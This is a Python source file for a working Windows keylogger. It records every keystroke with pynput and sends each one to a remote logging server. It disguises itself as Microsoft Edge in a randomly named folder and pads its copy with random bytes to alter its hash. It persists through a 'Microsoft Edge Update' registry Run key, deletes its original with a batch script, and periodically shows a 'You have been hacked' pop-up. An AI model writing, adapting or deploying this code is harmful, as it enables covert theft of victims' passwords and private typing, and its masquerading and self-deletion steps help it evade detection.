from pynput.keyboard import Listener
import requests
import random
import os
import sys
import subprocess
import winreg as reg
import ctypes
import shutil
import time

server_url = 'https://<host-ip>:5000/log'
key_press_count = 0  

def send_data(key):
    try:
        requests.post(server_url, data={'keystroke': str(key)}, verify=False)
    except Exception as e:
        print(f"Failed to send data: {e}")

def on_press(key):
    global key_press_count
    send_data(key)
    key_press_count += 1  
    
    if key_press_count >= 10:
        show_hacked_message()  
        key_press_count = 0 

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

def add_to_startup(exe_name, exe_path):
    # Add the executable to the registry to run at startup
    key = reg.HKEY_CURRENT_USER
    key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
    
    key_obj = reg.OpenKey(key, key_value, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(key_obj, exe_name, 0, reg.REG_SZ, exe_path)
    reg.CloseKey(key_obj)

def clone_and_modify():
    exe_path = sys.executable
    
    # Generate a random number to create a more legitimate-looking folder name
    random_number = random.randint(1000, 9999)
    new_folder_name = f"ms edge v{random_number}"
    new_folder_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', new_folder_name)
    new_location = os.path.join(new_folder_path, 'msedge.exe')
    
    os.makedirs(new_folder_path, exist_ok=True)
    
    # Copy the current executable to the new location
    try:
        shutil.copyfile(exe_path, new_location)
    except Exception as e:
        print(f"Error copying file: {e}")
        return False  

    # Modify the copied file by appending random bytes to it
    try:
        with open(new_location, 'ab') as f:
            random_bytes = os.urandom(1024)  
            f.write(random_bytes)
    except Exception as e:
        print(f"Error modifying file: {e}")
        return False  

    # Add a new registry key to run the cloned executable at startup
    add_to_startup("Microsoft Edge Update", new_location)
    
    # Launch the new executable with the flag to indicate it has been cloned
    try:
        subprocess.Popen([new_location, "--cloned"], shell=True)
    except Exception as e:
        print(f"Error launching cloned process: {e}")
        return False 

    return True  

def cleanup_original(exe_path):
    # Create a batch script to delete the original executable after this process exits
    cleanup_script = f'''
    @echo off
    :loop
    tasklist | findstr /i "{os.path.basename(exe_path)}" >nul
    if errorlevel 1 (
        del "{exe_path}"
        exit
    )
    timeout /t 1 /nobreak >nul
    goto loop
    '''
    
    # Save the batch script to a temporary file
    cleanup_file = os.path.join(os.getenv('TEMP'), 'cleanup.bat')
    with open(cleanup_file, 'w') as script_file:
        script_file.write(cleanup_script)
    
    # Execute the batch script
    subprocess.Popen([cleanup_file], shell=True)

def show_hacked_message():
    ctypes.windll.user32.MessageBoxW(0, "You have been hacked! I am listening to everything you type!", "Security Alert", 0x10 | 0x40)

if __name__ == "__main__":
    # Check if the script has already been cloned using a flag
    if "--cloned" not in sys.argv:
        if clone_and_modify():
            cleanup_original(sys.executable)
            os._exit(0)  
        else:
            print("Cloning and modification failed. Exiting.")
            sys.exit(1) 

    main()
